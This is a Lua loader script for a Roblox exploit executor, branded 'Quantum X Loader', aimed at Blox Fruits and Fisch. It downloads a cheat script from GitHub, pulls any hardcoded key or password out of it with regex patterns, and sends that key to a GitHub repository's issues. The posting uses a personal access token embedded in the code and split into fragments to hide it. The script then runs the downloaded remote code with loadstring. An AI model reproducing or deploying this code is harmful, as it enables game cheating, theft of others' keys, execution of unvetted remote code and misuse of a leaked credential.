if not getexecutorname then getgenv().getexecutorname = function() return "Xeno" end end
if not identifyexecutor then getgenv().identifyexecutor = function() return "Xeno" end end
if not request then 
    if syn and syn.request then 
        getgenv().request = syn.request
    else
        getgenv().request = function() 
            warn("Request function not available!") 
            return {StatusCode = 0}
        end
    end
end

local function SecurityCheck()
    if not game:IsLoaded() then
        warn("Security: Game not loaded!")
        return false
    end
    
    if identifyexecutor and identifyexecutor() ~= "Xeno" then
        warn("Security: Unauthorized executor!")
        return false
    end
    
    return true
end

if not SecurityCheck() then return end

local function GetToken()
    local parts = {
        "ghp_",
        "2QlU9iZ8",
        "m6qiJTzR",
        "LWlPUPE9",
        "qrscKz1z",
        "Kdq4"
    }
    return table.concat(parts)
end

local function GetRepoConfig()
    return {
        owner = "Fisterovna2",
        name = "RobloxKeys"
    }
end

local GamesTables = {
    [2753915549] = "BloxFruits",
    [4442272183] = "BloxFruits",
    [7449423635] = "BloxFruits",
    [16732694052] = "Fisch"
}

local function SafeHttpGet(url)
    local success, result = pcall(function()
        return game:HttpGetAsync(url, true)
    end)
    return success and result or nil
end

local function SendToGitHub(key)
    local config = GetRepoConfig()
    local token = GetToken()
    
    local url = "https://api.github.com/repos/"..config.owner.."/"..config.name.."/issues"
    local headers = {
        ["Authorization"] = "Bearer "..token,
        ["User-Agent"] = "SecureRobloxScript",
        ["Accept"] = "application/vnd.github.v3+json"
    }
    
    local gameName = "Неизвестно"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    local data = {
        title = "Ключ из "..gameName.." - "..os.date("%d.%m.%Y %H:%M"),
        body = "```lua\n-- PlaceID: "..game.PlaceId..
               "\n-- Игра: "..gameName..
               "\n\nKEY = \""..key.."\"\n```"
    }
    
    local json = game:GetService("HttpService"):JSONEncode(data)
    
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = json
    })
    
    if response and response.StatusCode == 201 then
        print("Ключ отправлен в GitHub Issues!")
        return true
    else
        local status = response and response.StatusCode or "no response"
        warn("Ошибка отправки: "..tostring(status))
        return false
    end
end

local function ExtractKey(script)
    local patterns = {
        'Key%s*=%s*["\']([^"\']+)["\']',
        'key%s*=%s*["\']([^"\']+)["\']',
        'KEY%s*=%s*["\']([^"\']+)["\']',
        'password%s*=%s*["\']([^"\']+)["\']'
    }
    
    for _, pattern in ipairs(patterns) do
        local key = script:match(pattern)
        if key and #key > 3 then return key end
    end
end

local function ExecuteGameScript(scriptContent)
    local func, err = loadstring(scriptContent)
    if func then
        local ran, execErr = pcall(func)
        if ran then
            print("Скрипт успешно выполнен!")
        else
            warn("Ошибка выполнения: "..tostring(execErr))
        end
    else
        warn("Ошибка компиляции: "..tostring(err))
    end
end

local function MainLoader()
    print("="..string.rep("=", 40))
    print(" Quantum X Loader v3.0 | Secure Edition")
    print("="..string.rep("=", 40))
    
    local gameData = GamesTables[game.PlaceId]
    if not gameData then
        warn("Игра не поддерживается | PlaceID: "..game.PlaceId)
        return
    end
    print("Игра определена: "..gameData)
    
    local scriptUrl = "https://raw.githubusercontent.com/Trustmenotcondom/QTONYX/main/"..gameData..".lua"
    print("Загрузка скрипта: "..scriptUrl)
    
    local scriptContent = SafeHttpGet(scriptUrl)
    if not scriptContent then
        warn("Ошибка загрузки скрипта")
        return
    end
    
    local key = ExtractKey(scriptContent)
    if not key then
        warn("Ключ не найден в скрипте")
    else
        print("Найден ключ: "..key)
        
        if SendToGitHub(key) then
            if setclipboard then
                setclipboard(key)
                print("Ключ скопирован в буфер обмена")
            end
        end
    end
    
    ExecuteGameScript(scriptContent)
    
    print("="..string.rep("=", 40))
    print(" Quantum X Loader завершил работу")
    print("="..string.rep("=", 40))
end

local success, err = pcall(MainLoader)
if not success then
    warn("Критическая ошибка: "..tostring(err))
end
